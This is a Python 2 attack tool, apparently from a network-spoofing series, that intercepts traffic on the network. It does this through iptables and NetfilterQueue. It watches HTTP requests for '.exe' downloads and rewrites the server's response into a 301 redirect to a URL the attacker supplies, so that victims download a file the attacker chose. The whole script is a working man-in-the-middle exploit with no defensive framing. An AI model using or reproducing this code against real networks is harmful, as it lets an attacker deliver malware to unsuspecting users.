#  Copyright (c) 2019. - ciphyr
#  Email: ciphyr[at]protonmail.com
#
#  Licensed under the Apache License, Version 2.0 (the "License");
#  You may not use this file except in compliance with the License.
#  You may obtain a copy of the License at
#
#  http://www.apache.org/licenses/LICENSE-2.0
#
#  Unless required by applicable law or agreed to in writing, software
#  distributed under the License is distributed on an "AS IS" BASIS,
#  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#  See the License for the specific language governing permissions and
#  limitations under the License.

import netfilterqueue
import scapy.all as scapy
import optparse
import subprocess


# Note: Python2 only due to netfilterqueue
# Future Improvements
# HTTPSstrip (in arp-spoofer), combine with dns-spoofer, display originally intended download URL

def config_iptables():
    subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])


def flush_iptables():
    print("[-] Flushing IP tables")
    subprocess.call(["iptables", "--flush"])


def get_cmd_args():
    parser = optparse.OptionParser()
    parser.add_option("-d", "--download", dest="download_url", help="Destination URL for spoofed download")
    (options, arguements) = parser.parse_args()

    if not options.download_url:
        parser.error("Use --help for usage info")

    return options


def analyze_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        # HTTP Requests
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+] .exe Request Detected")
                ack_list.append(scapy_packet[scapy.TCP].ack)

        # HTTP Responses
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file...")
                scapy_packet[
                    scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: " + options.download_url + "\n"

                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum

                packet.set_payload(str(scapy_packet))

    packet.accept()


ack_list = []

options = get_cmd_args()

print("[+] Configuring IP tables...")
config_iptables()
print("[+] Download Interceptor Ready. Waiting for: .exe request")

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, analyze_packet)

try:
    queue.run()
except KeyboardInterrupt:
    print("\n[-] Flushing/Restoring IP tables...")
    flush_iptables()
    print("[=] Complete. Program quiting...")
